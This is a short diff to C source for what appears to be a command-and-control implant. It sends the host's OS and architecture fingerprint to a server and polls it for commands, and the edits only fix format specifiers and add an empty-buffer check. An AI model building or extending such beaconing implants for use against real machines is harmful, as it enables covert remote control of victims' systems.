@@ -59,7 +59,7 @@ ERR_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
 
     // send the register data that includes system infomation!
     char registerStr[MAX_MSG_LEN];
-    snprintf(registerStr, MAX_MSG_LEN, "/register?id=%s&os=%s&arch=%s&time=%lld", client->id, version, arch, seconds);
+    snprintf(registerStr, MAX_MSG_LEN, "/register?id=%s&os=%s&arch=%s&time=%ld", client->id, version, arch, seconds);
 
     // (ab)uses GET request to send os fingerprint
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
@@ -130,7 +130,7 @@ static void retrieveArchInfo(char* arch) {
 ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
     time_t seconds = getCurrentTime();
     char commandRequ[MAX_MSG_LEN];
-    snprintf(commandRequ, MAX_MSG_LEN, "/commands?cid=%s&time=%lld", client->id, seconds);
+    snprintf(commandRequ, MAX_MSG_LEN, "/commands?cid=%s&time=%ld", client->id, seconds);
 
     // set up the request
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", commandRequ, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
@@ -148,8 +148,9 @@ ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
         return ECODE_GET;
     }
     client->cmdBuffer[bytesRead] = '\0';
-
     InternetCloseHandle(hRequest);
+
+    if (bytesRead == 0) { return ECODE_EMPTY_BUFFER; }
     return ECODE_SUCCESS;
 }
 
